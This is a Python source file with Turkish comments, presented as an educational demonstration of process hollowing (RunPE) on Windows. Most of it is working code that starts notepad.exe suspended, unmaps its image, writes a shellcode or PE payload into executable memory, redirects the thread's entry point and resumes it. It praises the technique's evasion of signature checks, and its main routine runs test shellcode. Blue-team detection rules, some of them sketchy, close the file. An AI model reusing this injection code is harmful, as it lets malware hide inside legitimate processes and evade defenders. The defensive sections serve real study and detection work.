"""
Technique 3: Process Hollowing (RunPE)
=======================================
Gelişmiş injection tekniği - Meşru process'in içini boşaltıp zararlı kod yükler.

MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing

API Çağrı Sırası:
1. CreateProcess() - SUSPENDED modda yeni process oluştur
2. NtUnmapViewOfSection() - Orijinal kodu bellekten kaldır
3. VirtualAllocEx() - Yeni bellek ayır
4. WriteProcessMemory() - Zararlı kodu yaz
5. SetThreadContext() - Entry point'i değiştir
6. ResumeThread() - Process'i çalıştır

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import sys
import os
import struct

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.win_api import (
    CreateProcessW, VirtualAllocEx, WriteProcessMemory, ReadProcessMemory,
    ResumeThread, CloseHandle, GetThreadContext, SetThreadContext,
    STARTUPINFO, PROCESS_INFORMATION, CONTEXT64, CONTEXT_FULL,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    CREATE_SUSPENDED, GetLastError
)

# ============================================================================
# NTDLL Functions for Process Hollowing
# ============================================================================

ntdll = ctypes.WinDLL('ntdll')

# NtUnmapViewOfSection - Bellek bölgesini kaldır
NtUnmapViewOfSection = ntdll.NtUnmapViewOfSection
NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
NtUnmapViewOfSection.restype = wintypes.LONG

# NtQueryInformationProcess - Process bilgisi al
NtQueryInformationProcess = ntdll.NtQueryInformationProcess

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                     TECHNIQUE 3: PROCESS HOLLOWING                            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AÇIKLAMA:                                                                ║
║  ─────────────                                                               ║
║  Process Hollowing (RunPE olarak da bilinir), meşru bir Windows              ║
║  process'inin bellek içeriğini "boşaltıp" yerine zararlı kod                 ║
║  yerleştirme tekniğidir. Bu sayede zararlı kod, meşru bir process            ║
║  kimliği altında çalışır.                                                    ║
║                                                                              ║
║  🔄 ADIM ADIM SÜREÇ:                                                         ║
║  ────────────────────                                                        ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │ ADIM 1: CreateProcess (CREATE_SUSPENDED)                            │    ║
║  │                                                                     │    ║
║  │    Attacker                    Suspended Process                    │    ║
║  │    ┌──────┐                    ┌─────────────────┐                 │    ║
║  │    │      │ ───CreateProcess──►│  notepad.exe    │                 │    ║
║  │    │      │    SUSPENDED       │  [ASKIDA]       │                 │    ║
║  │    └──────┘                    │  Kod yüklendi   │                 │    ║
║  │                                │  ama çalışmıyor │                 │    ║
║  │                                └─────────────────┘                 │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │ ADIM 2: NtUnmapViewOfSection (HOLLOW OUT)                           │    ║
║  │                                                                     │    ║
║  │    Suspended Process          →    Hollowed Process                 │    ║
║  │    ┌─────────────────┐            ┌─────────────────┐              │    ║
║  │    │ █████████████   │            │                 │              │    ║
║  │    │ █ notepad.exe █ │ ──UNMAP──► │     [BOŞ]       │              │    ║
║  │    │ █████████████   │            │                 │              │    ║
║  │    └─────────────────┘            └─────────────────┘              │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │ ADIM 3-4: VirtualAllocEx + WriteProcessMemory                       │    ║
║  │                                                                     │    ║
║  │    Hollowed Process           →    Injected Process                 │    ║
║  │    ┌─────────────────┐            ┌─────────────────┐              │    ║
║  │    │                 │            │ ░░░░░░░░░░░░░░░ │              │    ║
║  │    │     [BOŞ]       │ ──WRITE──► │ ░ MALWARE.EXE ░ │              │    ║
║  │    │                 │            │ ░░░░░░░░░░░░░░░ │              │    ║
║  │    └─────────────────┘            └─────────────────┘              │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │ ADIM 5-6: SetThreadContext + ResumeThread                           │    ║
║  │                                                                     │    ║
║  │    Thread Context                 Running Process                   │    ║
║  │    ┌─────────────────┐            ┌─────────────────┐              │    ║
║  │    │ RIP: 0x401000   │            │ ░░░░░░░░░░░░░░░ │              │    ║
║  │    │ (Entry Point)   │ ──RESUME──►│ ░ MALWARE.EXE ░ │ [ÇALIŞIYOR] │    ║
║  │    │ RSP: 0x7FF...   │            │ ░░░░░░░░░░░░░░░ │              │    ║
║  │    └─────────────────┘            └─────────────────┘              │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🎯 AVANTAJLARI:                                                             ║
║  ────────────────                                                            ║
║  • Meşru process görünümü (Task Manager'da notepad.exe görünür)             ║
║  • Dijital imza kontrollerini bypass eder                                    ║
║  • Parent-child ilişkisi normal görünür                                      ║
║  • Process yaratımı meşru görünür                                           ║
║                                                                              ║
║  ⚠️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • CREATE_SUSPENDED flag ile CreateProcess                                   ║
║  • NtUnmapViewOfSection/ZwUnmapViewOfSection çağrısı                        ║
║  • Suspended process'te bellek değişikliği                                  ║
║  • SetThreadContext ile RIP/EIP değişikliği                                 ║
║  • Image path ile bellekteki kod uyuşmazlığı                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# PROCESS HOLLOWING IMPLEMENTATION
# ============================================================================

def process_hollowing(target_exe: str, payload: bytes, verbose: bool = True) -> bool:
    """
    Process Hollowing gerçekleştir.
    
    Args:
        target_exe: Hedef executable yolu (örn: C:\\Windows\\System32\\notepad.exe)
        payload: Enjekte edilecek PE dosyası veya shellcode
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print(f"\n🎯 Hedef: {target_exe}")
        print("="*60)
    
    # Step 1: Create process in suspended state
    if verbose:
        print("\n[1/6] CreateProcess() - SUSPENDED modda process oluşturma...")
    
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(STARTUPINFO)
    
    process_info = PROCESS_INFORMATION()
    
    result = CreateProcessW(
        target_exe,                     # lpApplicationName
        None,                           # lpCommandLine
        None,                           # lpProcessAttributes
        None,                           # lpThreadAttributes
        False,                          # bInheritHandles
        CREATE_SUSPENDED,               # dwCreationFlags - SUSPENDED!
        None,                           # lpEnvironment
        None,                           # lpCurrentDirectory
        ctypes.byref(startup_info),     # lpStartupInfo
        ctypes.byref(process_info)      # lpProcessInformation
    )
    
    if not result:
        print(f"❌ CreateProcess başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Process oluşturuldu (SUSPENDED)")
        print(f"   🆔 PID: {process_info.dwProcessId}")
        print(f"   🧵 TID: {process_info.dwThreadId}")
        print(f"   📍 Process Handle: 0x{process_info.hProcess:X}")
    
    try:
        # Step 2: Get thread context to find image base
        if verbose:
            print("\n[2/6] GetThreadContext() - Thread context alma...")
        
        context = CONTEXT64()
        context.ContextFlags = CONTEXT_FULL
        
        result = GetThreadContext(process_info.hThread, ctypes.byref(context))
        
        if not result:
            print(f"❌ GetThreadContext başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Context alındı")
            print(f"   📍 RIP: 0x{context.Rip:016X}")
            print(f"   📍 RSP: 0x{context.Rsp:016X}")
            print(f"   📍 RDX: 0x{context.Rdx:016X} (PEB adresi)")
        
        # Step 3: Read PEB to get ImageBaseAddress
        if verbose:
            print("\n[3/6] ReadProcessMemory() - PEB'den ImageBase okuma...")
        
        # PEB.ImageBaseAddress offset: 0x10 (64-bit için)
        peb_image_base_offset = context.Rdx + 0x10
        
        image_base = ctypes.c_ulonglong()
        bytes_read = ctypes.c_size_t()
        
        result = ReadProcessMemory(
            process_info.hProcess,
            peb_image_base_offset,
            ctypes.byref(image_base),
            ctypes.sizeof(image_base),
            ctypes.byref(bytes_read)
        )
        
        if not result:
            print(f"⚠️ PEB okuma başarısız, varsayılan adres kullanılacak")
            image_base.value = 0x00400000  # Default image base
        
        if verbose:
            print(f"   ✅ ImageBase: 0x{image_base.value:016X}")
        
        # Step 4: Unmap original section (HOLLOW OUT)
        if verbose:
            print("\n[4/6] NtUnmapViewOfSection() - Orijinal kodu kaldırma (HOLLOWING)...")
        
        status = NtUnmapViewOfSection(process_info.hProcess, image_base.value)
        
        if verbose:
            if status == 0:
                print(f"   ✅ Section unmapped başarılı")
            else:
                print(f"   ⚠️ Unmap status: 0x{status:08X} (devam ediliyor)")
        
        # Step 5: Allocate new memory and write payload
        if verbose:
            print("\n[5/6] VirtualAllocEx + WriteProcessMemory() - Payload yazma...")
        
        # Allocate memory at the same base address
        new_base = VirtualAllocEx(
            process_info.hProcess,
            image_base.value,               # Aynı adrese
            len(payload),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not new_base:
            # Farklı adres dene
            new_base = VirtualAllocEx(
                process_info.hProcess,
                None,
                len(payload),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
        
        if not new_base:
            print(f"❌ VirtualAllocEx başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Bellek ayrıldı: 0x{new_base:016X}")
        
        # Write payload
        bytes_written = ctypes.c_size_t()
        result = WriteProcessMemory(
            process_info.hProcess,
            new_base,
            payload,
            len(payload),
            ctypes.byref(bytes_written)
        )
        
        if not result:
            print(f"❌ WriteProcessMemory başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Payload yazıldı: {bytes_written.value} bytes")
        
        # Step 6: Update thread context and resume
        if verbose:
            print("\n[6/6] SetThreadContext + ResumeThread() - Context güncelleme ve başlatma...")
        
        # Set new entry point (RIP = new_base for shellcode)
        context.Rip = new_base  # Entry point
        
        result = SetThreadContext(process_info.hThread, ctypes.byref(context))
        
        if not result:
            print(f"⚠️ SetThreadContext başarısız: {GetLastError()}")
        else:
            if verbose:
                print(f"   ✅ RIP güncellendi: 0x{context.Rip:016X}")
        
        # Resume thread
        resume_result = ResumeThread(process_info.hThread)
        
        if verbose:
            print(f"   ✅ Thread resumed (suspend count: {resume_result})")
        
        if verbose:
            print("\n" + "="*60)
            print("🎉 PROCESS HOLLOWING BAŞARILI!")
            print(f"   Hedef: {target_exe}")
            print(f"   PID: {process_info.dwProcessId}")
            print(f"   Payload: {len(payload)} bytes @ 0x{new_base:016X}")
            print("="*60)
        
        return True
        
    except Exception as e:
        print(f"❌ Hata: {e}")
        # Terminate suspended process
        ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
        return False
    
    finally:
        CloseHandle(process_info.hThread)
        CloseHandle(process_info.hProcess)

# ============================================================================
# SIMPLIFIED SHELLCODE HOLLOWING
# ============================================================================

def hollow_with_shellcode(shellcode: bytes, verbose: bool = True) -> bool:
    """
    Basitleştirilmiş Process Hollowing - Sadece shellcode için.
    notepad.exe kullanarak shellcode çalıştırır.
    
    Args:
        shellcode: Çalıştırılacak shellcode
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    target = "C:\\Windows\\System32\\notepad.exe"
    return process_hollowing(target, shellcode, verbose)

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 SYSMON DETECTION:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  <!-- Event ID 1: Process Created with SUSPENDED -->                         ║
║  <ProcessCreate onmatch="include">                                           ║
║    <!-- Detect suspended process creation -->                                ║
║    <CommandLine condition="contains">-suspended</CommandLine>                ║
║  </ProcessCreate>                                                            ║
║                                                                              ║
║  <!-- Event ID 10: Process Access for Hollowing -->                          ║
║  <ProcessAccess onmatch="include">                                           ║
║    <GrantedAccess condition="is">0x1FFFFF</GrantedAccess>                    ║
║    <CallTrace condition="contains">ntdll.dll</CallTrace>                     ║
║  </ProcessAccess>                                                            ║
║                                                                              ║
║  📋 SIGMA RULE:                                                              ║
║  ──────────────                                                              ║
║                                                                              ║
║  title: Process Hollowing Detection                                          ║
║  status: experimental                                                        ║
║  description: Detects potential process hollowing                            ║
║  logsource:                                                                  ║
║    category: process_creation                                                ║
║    product: windows                                                          ║
║  detection:                                                                  ║
║    selection:                                                                ║
║      EventID: 1                                                              ║
║    filter_suspended:                                                         ║
║      # Detect image/memory mismatch via other events                         ║
║    condition: selection                                                      ║
║  tags:                                                                       ║
║    - attack.defense_evasion                                                  ║
║    - attack.t1055.012                                                        ║
║                                                                              ║
║  📋 KQL QUERY (Defender):                                                    ║
║  ─────────────────────────                                                   ║
║                                                                              ║
║  // Detect NtUnmapViewOfSection calls                                        ║
║  DeviceEvents                                                                ║
║  | where ActionType == "NtUnmapViewOfSectionApiCall"                         ║
║  | project Timestamp, DeviceName, InitiatingProcessFileName,                 ║
║            TargetProcessId, TargetFileName                                   ║
║                                                                              ║
║  // Detect CREATE_SUSPENDED process creation                                 ║
║  DeviceProcessEvents                                                         ║
║  | where ProcessCreationFlags has "CREATE_SUSPENDED"                         ║
║  | project Timestamp, DeviceName, FileName, ProcessId,                       ║
║            InitiatingProcessFileName                                         ║
║                                                                              ║
║  // Detect image path vs memory content mismatch                             ║
║  DeviceImageLoadEvents                                                       ║
║  | where FileName != InitiatingProcessFileName                               ║
║  | where FolderPath startswith "C:\\Windows\\System32"                       ║
║                                                                              ║
║  📋 MEMORY FORENSICS:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  # Volatility3 - Detect hollowed processes                                   ║
║  vol -f memory.dmp windows.malfind                                           ║
║                                                                              ║
║  # Check for VAD/PEB inconsistencies                                         ║
║  vol -f memory.dmp windows.vadinfo --pid <PID>                               ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  1. Process image path ile bellekteki PE header uyuşmazlığı                  ║
║  2. Suspended state'ten resume sonrası anormal davranış                      ║
║  3. NtUnmapViewOfSection ardından WriteProcessMemory                         ║
║  4. SetThreadContext ile entry point değişikliği                             ║
║  5. Meşru process'ten beklenmeyen ağ bağlantısı                              ║
║  6. Meşru process'ten beklenmeyen child process                              ║
║                                                                              ║
║  📋 YARA MEMORY RULE:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  rule Process_Hollowing_Memory {                                             ║
║    meta:                                                                     ║
║      description = "Detects process hollowing in memory"                     ║
║      mitre = "T1055.012"                                                     ║
║    condition:                                                                ║
║      // PE header at unexpected location                                     ║
║      // VAD marked as private but contains PE                                ║
║      pe.is_pe and                                                            ║
║      not pe.is_dll and                                                       ║
║      pe.number_of_sections < 3                                               ║
║  }                                                                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    print("\n⚠️ Process Hollowing - Gelişmiş Teknik")
    print("="*60)
    
    # Load test shellcode
    try:
        from payloads.test_shellcodes import CALC_SHELLCODE_X64
        shellcode = CALC_SHELLCODE_X64
        print(f"📦 Shellcode yüklendi: {len(shellcode)} bytes")
    except ImportError:
        print("⚠️ Test shellcode bulunamadı")
        shellcode = bytes([0x90] * 100 + [0xC3])
    
    # Confirm
    print("\n🎯 Hedef: notepad.exe (yeni instance oluşturulacak)")
    confirm = input("⚠️ Process Hollowing yapılsın mı? (y/n): ").strip().lower()
    
    if confirm != 'y':
        print("İptal edildi.")
        sys.exit(0)
    
    # Execute
    hollow_with_shellcode(shellcode)
    
    # Print detection rules
    print(DETECTION_RULES)
